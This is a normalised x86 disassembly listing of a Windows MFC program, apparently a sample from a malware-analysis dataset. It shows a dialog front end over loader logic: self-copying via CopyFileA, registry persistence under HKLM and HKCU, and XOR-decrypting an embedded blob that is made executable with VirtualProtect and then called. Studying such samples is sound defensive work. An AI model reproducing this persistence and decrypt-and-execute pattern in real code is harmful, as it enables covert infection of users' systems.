sub_401060
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
push edi
mov edi [ lstrcpynA@IAT ]
push 0x104
lea ecx [ esi + 0x104 ]
push eax
push ecx
call edi
mov edx [ esp + 0xc ]
push 0x104
push edx
push esi
call edi
pop edi
mov eax 0x1
pop esi
retn 0x8
sub_4010b0
sub esp 0x10c
push ebx
push ebp
push esi
mov esi [ getenv@IAT ]
push edi
mov ebp ecx
push rw-data
mov [ esp + 0x18 ] 0x0
call esi
push rw-data
mov edi eax
call esi
add esp 0x8
mov esi eax
lea eax [ esp + 0x18 ]
mov [ esp + 0x10 ] esi
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
push 0x0
push rw-data
push edi
call [ lstrcatA@IAT ]
mov ebx [ CopyFileA@IAT ]
lea ecx [ esp + 0x1c ]
push eax
push ecx
call ebx
cmp eax 0x1
jne r-xdata
push 0x0
push rw-data
push esi
call [ lstrcatA@IAT ]
lea edx [ esp + 0x1c ]
push eax
push edx
call ebx
cmp eax 0x1
lea esi [ ebp + 0x104 ]
jne r-xdata
lea esi [ ebp + 0x104 ]
push edi
push esi
call [ sprintf@IAT ]
add esp 0x8
jmp r-xdata
push 0x0
lea ecx [ esp + 0x1c ]
push esi
push ecx
call ebx
mov eax [ esp + 0x10 ]
push eax
push esi
call [ sprintf@IAT ]
add esp 0x8
jmp r-xdata
mov edi [ RegCreateKeyA@IAT ]
lea edx [ esp + 0x14 ]
push edx
push rw-data
push 0x80000002
call edi
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ esp + 0x14 ]
mov [ esp + 0x10 ] ecx
push edx
push rw-data
push 0x80000001
call edi
test eax eax
jne r-xdata
mov edi [ lstrlenA@IAT ]
mov ebx [ RegSetValueExA@IAT ]
mov [ esp + 0x10 ] ecx
mov edx [ esp + 0x14 ]
push edx
call [ RegCloseKey@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10c
retn
mov edi [ lstrlenA@IAT ]
mov ebx [ RegSetValueExA@IAT ]
test eax eax
je r-xdata
push ebp
call edi
test eax eax
push esi
jg r-xdata
push ebp
call edi
test eax eax
push esi
jg r-xdata
lea edx [ esp + 0x14 ]
mov [ esp + 0x10 ] 0x0
push edx
push rw-data
push 0x80000001
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
call edi
mov ecx [ esp + 0x14 ]
push eax
push esi
push 0x1
push 0x0
push ebp
push ecx
call edi
push eax
mov eax [ esp + 0x18 ]
push esi
push 0x1
push 0x0
push 0x0
push eax
jmp r-xdata
call edi
mov ecx [ esp + 0x14 ]
push eax
push esi
push 0x1
push 0x0
push ebp
push ecx
call edi
push eax
mov eax [ esp + 0x18 ]
push esi
push 0x1
push 0x0
push 0x0
push eax
jmp r-xdata
cmp [ esp + 0x10 ] 0xa
jge r-xdata
cmp [ esp + 0x10 ] 0xa
jge r-xdata
jmp r-xdata
call ebx
mov edx [ esp + 0x10 ]
inc edx
test eax eax
mov [ esp + 0x10 ] edx
je r-xdata
cmp [ esp + 0x10 ] 0xa
jge r-xdata
call ebx
mov edx [ esp + 0x10 ]
inc edx
test eax eax
mov [ esp + 0x10 ] edx
je r-xdata
push ebp
call edi
test eax eax
push esi
jg r-xdata
call edi
mov ecx [ esp + 0x14 ]
push eax
push esi
push 0x1
push 0x0
push ebp
push ecx
call edi
push eax
mov eax [ esp + 0x18 ]
push esi
push 0x1
push 0x0
push 0x0
push eax
jmp r-xdata
jmp r-xdata
call ebx
mov edx [ esp + 0x10 ]
inc edx
test eax eax
mov [ esp + 0x10 ] edx
je r-xdata
sub_401350
push ebx
push esi
push edi
mov esi ecx
call sub_401300
mov eax 0x1
push rw-data
mov [ esi ] al
mov [ esi + 0x10c ] eax
mov [ esi + 0x31c ] 0x0
mov [ esi + 0x110 ] eax
call [ getenv@IAT ]
mov ebx [ lstrcpyA@IAT ]
add esp 0x4
mov edi eax
lea eax [ esi + 0x114 ]
push rw-data
push eax
call ebx
push rw-data
push edi
call [ lstrcatA@IAT ]
lea ecx [ esi + 0x218 ]
push eax
push ecx
call ebx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_4013d0
push 0xffffffff
push sub_40256b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov ebp ecx
push 0x730
call Ordinal_MFC42_823
add esp 0x4
mov [ esp + 0x10 ] eax
xor ebx ebx
cmp eax ebx
mov [ esp + 0x20 ] ebx
je r-xdata
mov ecx 0x1cc
mov esi ebp
mov edi ebx
mov [ esp + 0x20 ] 0xffffffff
[ edi ] [ esi ]
mov eax [ ebp + 0x110 ]
test eax eax
je r-xdata
mov ecx eax
call sub_401540
mov ebx eax
mov eax [ ebp + 0x31c ]
test eax eax
je r-xdata
lea eax [ ebp + 0x218 ]
lea ecx [ ebp + 0x114 ]
push eax
push ecx
mov ecx rw-data
call sub_401060
mov ecx rw-data
call sub_4010b0
push 0x0
push 0x1d0fb
push rw-data
mov ecx ebx
call sub_401550
push eax
call Ordinal_MFC42_823
add esp 0x4
mov esi eax
mov ecx ebx
push esi
push 0x1d0fb
push rw-data
call sub_401550
test ebx ebx
mov edi eax
je r-xdata
lea edx [ ebp + 0x62c ]
lea eax [ ebp + 0x528 ]
push edx
add ebp 0x320
push eax
push ebp
mov ecx rw-data
call sub_402060
mov ecx rw-data
call sub_4020e0
lea ecx [ esp + 0x14 ]
push ecx
push 0x40
push edi
push esi
call [ VirtualProtect@IAT ]
call esi
push 0xffffffff
call [ Sleep@IAT ]
push esi
call Ordinal_MFC42_825
add esp 0x4
push 0x0
call [ exit@IAT ]
mov ecx ebx
call j_sub_4010a0
push ebx
call Ordinal_MFC42_825
add esp 0x4
sub_401550
mov eax [ esp + 0x4 ]
mov edx ecx
push ebx
push ebp
mov ecx [ eax ]
push esi
mov [ edx + 0x108 ] ecx
mov ecx [ eax ]
mov esi [ eax + 0x4 ]
mov ebp ecx
push edi
add esi eax
lea edi [ edx + 0x1 ]
mov ebx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi [ eax + 0xc ]
mov ecx [ edx + 0x10c ]
mov ebx [ ebx + 0x8 ]
add eax edi
dec ecx
jne r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
mov ecx [ esp + 0x1c ]
push ecx
push ebx
push eax
mov ecx edx
call sub_4015b0
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
sub_4015b0
push esi
push edi
mov edi ecx
mov ecx [ esp + 0x14 ]
mov esi [ edi + 0x108 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0x10 ]
push ebx
xor ebx ebx
test edx edx
jbe r-xdata
mov eax [ esp + 0x10 ]
pop edi
add eax esi
pop esi
retn 0xc
pop ebx
pop edi
mov eax edx
pop esi
retn 0xc
push ebp
mov ebp [ esp + 0x14 ]
sub ebp ecx
lea eax [ edx - 0x14 ]
cmp ebx eax
jbe r-xdata
add ecx ebx
inc ebx
cmp ebx edx
jb r-xdata
push ecx
push rw-data
call [ printf@IAT ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
add esp 0x8
mov dl [ edi + eax + 0x1 ]
xor dl [ ecx + ebp ]
inc eax
cmp eax esi
mov [ ecx ] dl
jl r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
xor eax eax
test esi esi
jle r-xdata
pop ebp
sub_401720
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4025a1
push eax
mov [ fs : 0x0 ] esp
sub esp 0x798
push ebp
push esi
push edi
mov ebp ecx
push 0x0
call Ordinal_MFC42_1134
push 0x0
call [ time@IAT ]
push eax
call [ srand@IAT ]
mov edi [ rand@IAT ]
add esp 0xc
xor esi esi
call edi
test eax eax
jle r-xdata
lea ecx [ esp + 0x74 ]
call sub_401350
lea ecx [ esp + 0x74 ]
mov [ esp + 0x7ac ] 0x0
call sub_4013d0
add esi 0x2
call edi
cmp esi eax
jl r-xdata
sub_401810
push 0xffffffff
push sub_4025b8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x60 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_800
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call Ordinal_MFC42_641
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4018f0
push 0xffffffff
push sub_4025e3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
push eax
push 0x66
mov [ esp + 0xc ] esi
call Ordinal_MFC42_324
lea ecx [ esi + 0x60 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_540
mov [ esp + 0x10 ] 0x1
mov [ esi ] r--data
call Ordinal_MFC42_1168
push 0x80
push 0xe
push 0x80
call Ordinal_MFC42_1146
push eax
call [ LoadIconA@IAT ]
mov ecx [ esp + 0x8 ]
mov [ esi + 0x64 ] eax
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4019b0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_402600
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push edi
mov esi ecx
call Ordinal_MFC42_4710
mov eax [ esi + 0x20 ]
push 0x0
push eax
call [ GetSystemMenu@IAT ]
push eax
call Ordinal_MFC42_2863
mov edi eax
test edi edi
je r-xdata
mov eax [ esi + 0x64 ]
mov edx [ esi + 0x20 ]
mov edi [ SendMessageA@IAT ]
push eax
push 0x1
push 0x80
push edx
call edi
mov eax [ esi + 0x64 ]
push eax
mov eax [ esi + 0x20 ]
push 0x0
push 0x80
push eax
call edi
lea ecx [ esp + 0xc ]
call Ordinal_MFC42_540
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0x1
call Ordinal_MFC42_860
push rw-data
lea ecx [ esi + 0x60 ]
call Ordinal_MFC42_860
mov ecx [ esp + 0xc ]
push ecx
push 0x3e8
mov ecx esi
call Ordinal_MFC42_3092
mov ecx eax
call Ordinal_MFC42_6199
push 0x0
push 0x3e8
mov ecx esi
call Ordinal_MFC42_3092
mov ecx eax
call Ordinal_MFC42_2642
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x10 ]
pop edi
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
lea ecx [ esp + 0x8 ]
call Ordinal_MFC42_540
push 0x65
lea ecx [ esp + 0xc ]
mov [ esp + 0x1c ] 0x0
call Ordinal_MFC42_4160
mov ecx [ esp + 0x8 ]
mov eax [ ecx - 0x8 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call Ordinal_MFC42_800
mov edx [ edi + 0x4 ]
push ebx
mov ebx [ AppendMenuA@IAT ]
push 0x0
push 0x0
push 0x800
push edx
call ebx
mov eax [ esp + 0xc ]
mov ecx [ edi + 0x4 ]
push eax
push 0x10
push 0x0
push ecx
call ebx
pop ebx
sub_401af0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_402618
push eax
mov eax [ esp + 0x10 ]
mov [ fs : 0x0 ] esp
and eax 0xfff0
sub esp 0x60
cmp eax 0x10
jne r-xdata
call Ordinal_MFC42_2379
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
add esp 0x6c
retn 0x8
lea ecx [ esp ]
call sub_401880
lea ecx [ esp ]
mov [ esp + 0x68 ] 0x0
call Ordinal_MFC42_2514
lea ecx [ esp ]
mov [ esp + 0x68 ] 0xffffffff
call Ordinal_MFC42_641
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
add esp 0x6c
retn 0x8
sub_401b70
sub esp 0x64
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
push eax
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov ecx esi
call Ordinal_MFC42_2379
pop esi
add esp 0x64
retn
push ebx
push edi
push esi
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_470
mov edi [ esp + 0x20 ]
lea eax [ esp + 0x1c ]
mov ecx [ esi + 0x20 ]
push 0x0
neg eax
sbb eax eax
and eax edi
push eax
push 0x27
push ecx
call [ SendMessageA@IAT ]
mov edi [ GetSystemMetrics@IAT ]
push 0xb
call edi
push 0xc
mov ebx eax
call edi
mov edi eax
mov eax [ esi + 0x20 ]
lea edx [ esp + 0xc ]
push edx
push eax
call [ GetClientRect@IAT ]
mov ecx [ esi + 0x64 ]
mov eax [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x14 ]
sub eax ecx
sub eax edi
inc eax
cdq
sub eax edx
mov edx [ esp + 0x10 ]
sar eax 0x1
push eax
mov eax [ esp + 0x1c ]
sub eax edx
sub eax ebx
inc eax
cdq
sub eax edx
mov edx [ esp + 0x28 ]
sar eax 0x1
push eax
push edx
call [ DrawIcon@IAT ]
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_755
pop edi
pop ebx
pop esi
add esp 0x64
retn
sub_401c40
push 0xffffffff
push sub_402651
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x200
push esi
push 0x0
push rw-data
push 0x4
mov esi ecx
push rw-data
push rw-data
push 0x0
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_355
lea ecx [ esp + 0x8 ]
mov [ esp + 0x20c ] 0x0
call Ordinal_MFC42_2515
cmp eax 0x1
jne r-xdata
lea ecx [ esp + 0xb8 ]
mov [ esp + 0x20c ] 0x2
call Ordinal_MFC42_800
lea ecx [ esp + 0x8 ]
mov [ esp + 0x20c ] 0xffffffff
call Ordinal_MFC42_641
mov ecx [ esp + 0x204 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x20c
retn
lea eax [ esp + 0x4 ]
lea ecx [ esp + 0x8 ]
push eax
call Ordinal_MFC42_3177
mov ecx [ esp + 0x4 ]
mov [ esp + 0x20c ] 0x1
push ecx
push 0x3e9
mov ecx esi
call Ordinal_MFC42_3092
mov ecx eax
call Ordinal_MFC42_6199
lea ecx [ esp + 0x4 ]
mov [ esp + 0x20c ] 0x0
call Ordinal_MFC42_800
sub_401d20
push 0xffffffff
push sub_402668
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0xb0 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_800
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call Ordinal_MFC42_641
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_401d70
push 0xffffffff
push sub_402688
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push edi
mov edi ecx
lea ecx [ esp + 0x4 ]
call Ordinal_MFC42_540
lea eax [ esp + 0x4 ]
mov ecx edi
push eax
push 0x3e9
mov [ esp + 0x20 ] 0x0
call Ordinal_MFC42_3092
mov ecx eax
call Ordinal_MFC42_3874
mov ecx [ esp + 0x4 ]
mov eax [ ecx - 0x8 ]
test eax eax
jne r-xdata
mov edi [ edi + 0x60 ]
lea edx [ esp + 0xc ]
push esi
lea eax [ esp + 0xc ]
xor esi esi
push edx
push eax
push esi
push 0xf003f
push esi
push esi
push esi
push edi
push 0x80000002
mov [ esp + 0x30 ] esi
call [ RegCreateKeyExA@IAT ]
test eax eax
jne r-xdata
push 0x0
push rw-data
push rw-data
mov ecx edi
call Ordinal_MFC42_4224
lea ecx [ esp + 0x4 ]
mov [ esp + 0x18 ] 0xffffffff
call Ordinal_MFC42_800
pop edi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
add esp 0x18
retn
mov eax [ esp + 0x8 ]
push eax
mov edi eax
call [ lstrlenA@IAT ]
inc eax
push eax
push edi
push 0x1
push 0x0
push rw-data
push esi
call [ RegSetValueExA@IAT ]
test esi esi
je r-xdata
mov esi [ esp + 0xc ]
lea ecx [ esp + 0x8 ]
mov [ esp + 0x1c ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x14 ]
pop esi
pop edi
mov [ fs : 0x0 ] ecx
add esp 0x18
retn
push esi
call [ RegCloseKey@IAT ]
sub_401e80
push ecx
mov ecx [ ecx + 0x60 ]
lea eax [ esp ]
push esi
push eax
push 0xf003f
push 0x0
push ecx
push 0x80000002
mov [ esp + 0x18 ] 0x0
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
pop esi
pop ecx
retn
mov esi [ esp + 0x4 ]
push rw-data
push esi
call [ RegDeleteValueA@IAT ]
test esi esi
je r-xdata
push esi
call [ RegCloseKey@IAT ]
sub_401ed0
push 0xffffffff
push sub_4026b6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x90
push ebx
push ebp
push esi
xor esi esi
push edi
mov edi ecx
xor ebx ebx
mov [ esp + 0x18 ] esi
lea ecx [ esp + 0x14 ]
mov [ esp + 0xa8 ] ebx
call Ordinal_MFC42_540
mov eax [ edi + 0x60 ]
lea ecx [ esp + 0x10 ]
push ecx
push 0xf003f
push ebx
push eax
push 0x80000002
mov [ esp + 0xbc ] 0x1
mov [ esp + 0x24 ] ebx
call [ RegOpenKeyExA@IAT ]
mov ebp [ RegCloseKey@IAT ]
cmp eax ebx
jne r-xdata
lea ecx [ esp + 0x14 ]
mov [ esp + 0xa8 ] bl
call Ordinal_MFC42_800
cmp esi ebx
je r-xdata
mov esi [ esp + 0x10 ]
lea edx [ esp + 0x1c ]
lea eax [ esp + 0x20 ]
push edx
lea ecx [ esp + 0x14 ]
push eax
push ecx
push ebx
push rw-data
push esi
mov [ esp + 0x30 ] esi
mov [ esp + 0x28 ] ebx
call [ RegQueryValueExA@IAT ]
cmp eax ebx
jne r-xdata
mov ecx [ esp + 0xa0 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x9c
retn
push esi
call ebp
push ebx
push rw-data
push rw-data
mov edx [ esp + 0x1c ]
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x18 ]
push rw-data
push ecx
mov [ esp + edx + 0x2c ] bl
call Ordinal_MFC42_2818
mov edx [ esp + 0x20 ]
add esp 0xc
push ebx
push rw-data
push edx
jmp r-xdata
push esi
call ebp
xor esi esi
mov [ esp + 0x18 ] esi
mov ecx edi
call Ordinal_MFC42_4224
cmp esi ebx
je r-xdata
sub_402060
mov eax [ esp + 0x4 ]
push esi
push edi
mov edi [ lstrcpynA@IAT ]
mov esi ecx
push 0x104
push eax
push esi
call edi
mov ecx [ esp + 0x10 ]
push 0x104
lea edx [ esi + 0x104 ]
push ecx
push edx
call edi
mov eax [ esp + 0x14 ]
push 0x104
lea ecx [ esi + 0x208 ]
push eax
push ecx
call edi
xor eax eax
mov ecx 0x1
mov [ esi + 0x314 ] eax
mov [ esi + 0x318 ] 0x10
mov [ esi + 0x31c ] ecx
mov [ esi + 0x320 ] ecx
mov [ esi + 0x324 ] eax
mov [ esi + 0x328 ] eax
mov [ esi + 0x32c ] eax
mov [ esi + 0x330 ] eax
pop edi
pop esi
retn 0xc
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_4024f5
cmp [ rw-data ] ebx
jne r-xdata
call sub_4024e0
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_4024f2
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_402502
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_40251a
call Ordinal_MFC42_1168
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test ecx ecx
mov [ eax + 0x14 ] cl
mov [ eax + 0x1040 ] edx
jne r-xdata
push 0x1
pop eax
retn 0x8
push 0xfffffffd
call [ _setmbcp@IAT ]
pop ecx
sub_401000
call sub_401010
jmp sub_401020
sub_401010
mov ecx rw-data
jmp sub_401040
sub_401020
push sub_401030
call sub_402356
pop ecx
retn
sub_401030
mov ecx rw-data
jmp sub_4010a0
sub_401040
push esi
mov esi ecx
push 0x104
lea eax [ esi + 0x104 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
mov eax esi
pop esi
retn
sub_4010a0
retn
sub_4012c0
call sub_4012d0
jmp sub_4012e0
sub_4012d0
mov ecx rw-data
jmp sub_401300
sub_4012e0
push sub_4012f0
call sub_402356
pop ecx
retn
sub_4012f0
mov ecx rw-data
jmp sub_4010a0
sub_401300
mov eax ecx
retn
sub_401310
call sub_401320
jmp sub_401330
sub_401320
mov ecx rw-data
jmp sub_401300
sub_401330
push sub_401340
call sub_402356
pop ecx
retn
sub_401340
mov ecx rw-data
jmp sub_4010a0
j_sub_4010a0
jmp sub_4010a0
sub_401510
mov ecx rw-data
jmp sub_401300
sub_401520
push sub_401530
call sub_402356
pop ecx
retn
sub_401530
mov ecx rw-data
jmp sub_4010a0
sub_401540
push esi
mov esi ecx
call sub_401300
mov eax esi
pop esi
retn
sub_401630
call sub_401640
jmp sub_401650
sub_401640
mov ecx rw-data
jmp sub_401300
sub_401650
push sub_401660
call sub_402356
pop ecx
retn
sub_401660
mov ecx rw-data
jmp sub_4010a0
sub_401670
mov eax [ Ordinal_MFC42_4274@IAT ]
retn
sub_401680
mov eax r--data
retn
sub_401690
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_561
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_4016b0
push esi
mov esi ecx
call sub_4016d0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4016d0
jmp Ordinal_MFC42_815
sub_4016e0
call sub_4016f0
jmp sub_401700
sub_4016f0
mov ecx rw-data
jmp sub_401690
sub_401700
push sub_401710
call sub_402356
pop ecx
retn
sub_401710
mov ecx rw-data
jmp sub_4016d0
sub_401860
retn
sub_401870
retn 0x4
sub_401880
push esi
push 0x0
mov esi ecx
push 0x64
call Ordinal_MFC42_324
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_4018a0
push esi
mov esi ecx
call sub_4018c0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4018c0
jmp Ordinal_MFC42_641
sub_4018d0
mov eax [ Ordinal_MFC42_4234@IAT ]
retn
sub_4018e0
mov eax r--data
retn
sub_401970
push esi
mov esi ecx
call sub_401810
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_401990
retn 0x4
sub_4019a0
mov eax r--data
retn
sub_401c30
mov eax [ ecx + 0x64 ]
retn
sub_401fe0
mov eax [ ecx + 0x20 ]
push 0x0
push eax
call [ EnableWindow@IAT ]
retn
sub_401ff0
mov eax [ ecx + 0x20 ]
push 0x1
push eax
call [ EnableWindow@IAT ]
retn
sub_402000
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ RegCloseKey@IAT ]
mov [ esi ] 0x0
sub_402020
call sub_402030
jmp sub_402040
sub_402030
mov ecx rw-data
jmp sub_401300
sub_402040
push sub_402050
call sub_402356
pop ecx
retn
sub_402050
mov ecx rw-data
jmp sub_4010a0
sub_4020e0
xor eax eax
retn
Ordinal_MFC42_825
jmp [ Ordinal_MFC42_825@IAT ]
Ordinal_MFC42_823
jmp [ Ordinal_MFC42_823@IAT ]
Ordinal_MFC42_4673
jmp [ Ordinal_MFC42_4673@IAT ]
Ordinal_MFC42_6375
jmp [ Ordinal_MFC42_6375@IAT ]
Ordinal_MFC42_4486
jmp [ Ordinal_MFC42_4486@IAT ]
Ordinal_MFC42_2554
jmp [ Ordinal_MFC42_2554@IAT ]
Ordinal_MFC42_2512
jmp [ Ordinal_MFC42_2512@IAT ]
Ordinal_MFC42_5731
jmp [ Ordinal_MFC42_5731@IAT ]
Ordinal_MFC42_3922
jmp [ Ordinal_MFC42_3922@IAT ]
Ordinal_MFC42_1089
jmp [ Ordinal_MFC42_1089@IAT ]
Ordinal_MFC42_5199
jmp [ Ordinal_MFC42_5199@IAT ]
Ordinal_MFC42_2396
jmp [ Ordinal_MFC42_2396@IAT ]
Ordinal_MFC42_3346
jmp [ Ordinal_MFC42_3346@IAT ]
Ordinal_MFC42_5300
jmp [ Ordinal_MFC42_5300@IAT ]
Ordinal_MFC42_5302
jmp [ Ordinal_MFC42_5302@IAT ]
Ordinal_MFC42_2725
jmp [ Ordinal_MFC42_2725@IAT ]
Ordinal_MFC42_4079
jmp [ Ordinal_MFC42_4079@IAT ]
Ordinal_MFC42_4698
jmp [ Ordinal_MFC42_4698@IAT ]
Ordinal_MFC42_5307
jmp [ Ordinal_MFC42_5307@IAT ]
Ordinal_MFC42_5289
jmp [ Ordinal_MFC42_5289@IAT ]
Ordinal_MFC42_5714
jmp [ Ordinal_MFC42_5714@IAT ]
Ordinal_MFC42_2982
jmp [ Ordinal_MFC42_2982@IAT ]
Ordinal_MFC42_3147
jmp [ Ordinal_MFC42_3147@IAT ]
Ordinal_MFC42_3259
jmp [ Ordinal_MFC42_3259@IAT ]
Ordinal_MFC42_4465
jmp [ Ordinal_MFC42_4465@IAT ]
Ordinal_MFC42_3136
jmp [ Ordinal_MFC42_3136@IAT ]
Ordinal_MFC42_3262
jmp [ Ordinal_MFC42_3262@IAT ]
Ordinal_MFC42_2985
jmp [ Ordinal_MFC42_2985@IAT ]
Ordinal_MFC42_3081
jmp [ Ordinal_MFC42_3081@IAT ]
Ordinal_MFC42_2976
jmp [ Ordinal_MFC42_2976@IAT ]
Ordinal_MFC42_3830
jmp [ Ordinal_MFC42_3830@IAT ]
Ordinal_MFC42_3831
jmp [ Ordinal_MFC42_3831@IAT ]
Ordinal_MFC42_3825
jmp [ Ordinal_MFC42_3825@IAT ]
Ordinal_MFC42_3079
jmp [ Ordinal_MFC42_3079@IAT ]
Ordinal_MFC42_4080
jmp [ Ordinal_MFC42_4080@IAT ]
Ordinal_MFC42_4622
jmp [ Ordinal_MFC42_4622@IAT ]
Ordinal_MFC42_4424
jmp [ Ordinal_MFC42_4424@IAT ]
Ordinal_MFC42_3738
jmp [ Ordinal_MFC42_3738@IAT ]
Ordinal_MFC42_561
jmp [ Ordinal_MFC42_561@IAT ]
Ordinal_MFC42_815
jmp [ Ordinal_MFC42_815@IAT ]
Ordinal_MFC42_641
jmp [ Ordinal_MFC42_641@IAT ]
Ordinal_MFC42_800
jmp [ Ordinal_MFC42_800@IAT ]
Ordinal_MFC42_2514
jmp [ Ordinal_MFC42_2514@IAT ]
Ordinal_MFC42_2621
jmp [ Ordinal_MFC42_2621@IAT ]
Ordinal_MFC42_1134
jmp [ Ordinal_MFC42_1134@IAT ]
Ordinal_MFC42_5265
jmp [ Ordinal_MFC42_5265@IAT ]
Ordinal_MFC42_4376
jmp [ Ordinal_MFC42_4376@IAT ]
Ordinal_MFC42_4853
jmp [ Ordinal_MFC42_4853@IAT ]
Ordinal_MFC42_4998
jmp [ Ordinal_MFC42_4998@IAT ]
Ordinal_MFC42_4710
jmp [ Ordinal_MFC42_4710@IAT ]
Ordinal_MFC42_6052
jmp [ Ordinal_MFC42_6052@IAT ]
Ordinal_MFC42_4078
jmp [ Ordinal_MFC42_4078@IAT ]
Ordinal_MFC42_1775
jmp [ Ordinal_MFC42_1775@IAT ]
Ordinal_MFC42_4407
jmp [ Ordinal_MFC42_4407@IAT ]
Ordinal_MFC42_5241
